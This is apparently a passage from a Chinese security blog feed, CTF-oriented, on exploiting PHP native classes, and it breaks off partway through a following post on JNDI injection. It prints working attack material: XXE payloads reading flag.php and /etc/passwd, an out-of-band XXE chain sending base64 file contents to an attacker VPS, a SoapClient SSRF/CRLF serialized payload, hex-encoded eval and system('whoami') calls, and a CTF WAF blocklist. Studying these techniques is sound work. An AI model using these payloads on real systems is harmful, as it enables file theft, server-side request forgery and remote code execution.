class="string">&lt;x&gt;&amp;xxe;&lt;/x&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> SimpleXMLElement(<span class="variable">$a</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要两个参数可控</p><p>利用<code>SimpleXMLElement</code>构造一个XML文档，从而利用 XXE读取文件 。当文件中有&lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以要利用php://filter，将要读取的文件内容经过 base64编码 后输出。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[   </span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]</span><br><span class="line">&gt;</span><br><span class="line">&lt;a&gt;&amp;name;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>有几个地方需要注意以下，在url中不能直接打<code>&amp;</code> 会被歧义，我们使用 <code>%26</code> 还有就是<code>resource=</code>后面不需要引号包裹。第二个参数里的2对应的模式是 LIBXML_NOENT。<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]&gt;&lt;a&gt;%26name;&lt;&#x2F;a&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure><p>至于为什么第二个参数为二，实际上这里2对应的模式是 LIBXML_NOENT ，我们直接记住用二吧不然就是直接百度。</p><h3 id="远程读取"><a href="#远程读取" class="headerlink" title="远程读取"></a>远程读取</h3><p>必须有三个参数可控，才能读取远程xml文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param3</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="comment">//$newclass = new $classname($param,$param2);</span></span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>,<span class="variable">$param3</span>);</span><br><span class="line">    var_dump(<span class="variable">$newclass</span>);</span><br><span class="line"><span class="comment">//    foreach ($newclass as $key=&gt;$value)</span></span><br><span class="line"><span class="comment">//        echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SimpleXMLElement读取远程文件evil.xml-&gt;evil.xml请求send.xml，实际执行的是send.xml</p><p>send.php负责保存结果，在vps上构造如下evil.xml、send.xml和send.php这三个文件。</p><p>evil.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;send.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>send.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.111.129&#x2F;send.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>send.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">file_put_contents(<span class="string">&quot;result.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在url中构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;show.php?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;evil.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true</span><br></pre></td></tr></table></figure><p>接收到数据</p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c2d1bf9.jpg"></p><h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h1><p>__toString</p><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c33a1fc.jpg"></p><h2 id="getmessage"><a href="#getmessage" class="headerlink" title="getmessage"></a>getmessage</h2><p>getMessage可直接传入eval执行命令，将转换成hex执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Error(&#39;?&#39;);</span><br><span class="line">$c &#x3D; &quot;getMessage&quot;;</span><br><span class="line">$d &#x3D; &quot;eval(phpinfo())&quot;;</span><br><span class="line">eval(&quot;\$a-&gt;$c($d);&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(<span class="string">&quot;6563686f20706928293b&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> bin2hex(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;getMessage(<span class="keyword">eval</span>(hex2bin(<span class="string">&quot;706870696e666f28293b&quot;</span>)));</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//echo bin2hex(&#x27;phpinfo()&#x27;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>php存在内置类<code>SoapClient::__call</code>，存在可以触发<code>__call</code>方法时，可以进行ssrf</p><p>进行SSRF</p><p>配合CRLF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://192.168.111.129:5555/path&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;not_exists_function();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功接收到报文</p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c3b4772.jpg"></p><h1 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h1><p>遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">public</span> __construct ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line"><span class="keyword">public</span> current ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="keyword">public</span> getATime ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getBasename ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getCTime ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getExtension ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getFilename ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getGroup ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getInode ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getMTime ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getOwner ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getPath ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getPathname ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getPerms ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getSize ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getType ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> isDir ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isDot ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isExecutable ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isFile ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isLink ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isReadable ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isWritable ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> key ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> next ( ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> rewind ( ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> seek ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span>    <span class="comment">// 以字符串形式获取文件名</span></span><br><span class="line"><span class="keyword">public</span> valid ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h1><p>列出目录下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><p>读取文件，但是不添加其他参数只能读取第一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure><p>可以通过遍历的方式读取所有内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h1><p>invokeArgs 可执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;call_user_func&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionFunction(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d8ab33c9bd.jpg"></p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/U4bbd76a58f51487b9f366ef386ad88504.jpg"></p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>,<span class="string">&quot;NepnEpneP&quot;</span>, <span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="variable">$__</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$_</span>(<span class="variable">$__</span>);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    <span class="variable">$d</span> = waf(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;getMessage&quot;</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo \$a-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = new Error(&#x27;?&#x27;);</span></span><br><span class="line"><span class="comment">//$c = &quot;getMessage&quot;;</span></span><br><span class="line"><span class="comment">//$d = &quot;eval(phpinfo())&quot;;</span></span><br><span class="line"><span class="comment">//eval(&quot;\$a-&gt;$c($d);&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JNDI注入</title>
    <link href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。JNDI本质上是一个接口，在这个接口下可以实现多种目录系统服务，如RMI、LDAP等，可以通过名称查询相关对象</p><p><img src="https://www.hualigs.cn/image/607a712f64075.jpg"></p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation）  即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message  Protocol，Java远程消息交换协议）以及CORBA。</p><p>相当于跨越jvm，调用一个远程方法。RMI是一种行为，即Java远程方法调用</p><h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p><p>本质上是一个协议，用于Java RMI过程，功能上相当于web访问中的http协议，只有通过使用该协议才能实现RMI远程方法调用</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。本质上相当于一个数据库，</p><h1 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h1><p>JNDI支持多种服务类型，当服务类型为RMI协议时，如果从RMI注册服务中lookup的对象类型为Reference类型或其子类时会导致远程代码执行。</p><p>因为Reference类提供了两个重要属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.className</span><br><span class="line">远程调用引用的类名</span><br><span class="line"></span><br><span class="line">2.codebase url</span><br><span class="line">决定在进行rmi远程调用时对象的位置，codebase url支持http协议，当通过lookup寻找的远程调用类在RMI服务器的CLASSPATH不存在时就会从指定的codebase url进行类的加载，如果两者都没有，远程调用失败</span><br></pre></td></tr></table></figure><p><strong>JNDI RCE漏洞产生原因</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在lookup的时候，会从RMI注册中心下载数据，由于服务名称和对象或命名引用相关联，只要在Registrations注册中心注册一个命名引用，即Reference，它具有三个参数，className、factory、classFactoryLocation。ookup它并下载到本地后，会使用Reference的classFactoryLocation指定的地址去下载className指定class文件，接着加载并实例化，这样就会远程调用类的构造方法，如果把恶意代码放在远程调用类的构造方法中，就可以触发RCE。</span><br></pre></td></tr></table></figure><h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h1><p>适用版本：小于JDK 6u132<code>, </code>JDK 7u122<code>, </code>JDK 8u113（原因是Java提升了JNDI 限制了<code>Naming/Directory</code>服务中<code>JNDI Reference</code>远程加载<code>Object Factory</code>类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为<code>false</code>，即默认不允许从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。）</p><p><strong>测试jdk版本 8u101</strong></p><p>CIENT.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/aa&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SERVER.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span 